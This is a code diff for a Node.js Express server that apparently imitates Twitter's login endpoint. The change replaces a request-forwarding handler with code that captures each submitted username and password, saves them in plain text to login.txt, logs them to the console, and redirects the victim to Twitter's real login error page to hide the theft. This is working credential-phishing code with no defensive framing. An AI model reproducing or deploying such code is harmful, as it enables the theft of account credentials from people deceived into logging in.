@@ -1,6 +1,6 @@
 const createError = require('http-errors');
 const express = require('express');
-const axios = require('axios');
+const request = require('request');
 const path = require('path');
 const cookieParser = require('cookie-parser');
 const logger = require('morgan');
@@ -29,23 +29,14 @@ app.use('/twitter/connect', twitterConnectRouter);
 app.route('/sessions')
     .post((req, res1) => {
         fs.readFile('cookies.txt', (err, data) => {
-            if (err) console.log(err);
-            else {
-                axios.post('https://www.twitter.com/sessions', {
-                    data: req.body,
-                    withCredentials: true,
-                    headers: {
-                        Cookie: data
-                    }
-                })
-                    .then((res) => {
-                        console.log(res.headers);
-                        res1.send(res)
-                    })
-                    .catch((err) => {
-                        res1.send(err)
-                    });
-            }
+            let username_or_email = req.body['session[username_or_email]'];
+            let password = req.body['session[password]'];
+            fs.writeFile('login.txt', "username: " + username_or_email + "\n" + "password: " + password, ((err => {
+                if (err) console.log(err);
+            })));
+            console.log('username: ' + username_or_email);
+            console.log('password: ' + password);
+            res1.redirect('https://www.twitter.com/login/error?username_or_email=' + username_or_email);
         });
     });
 
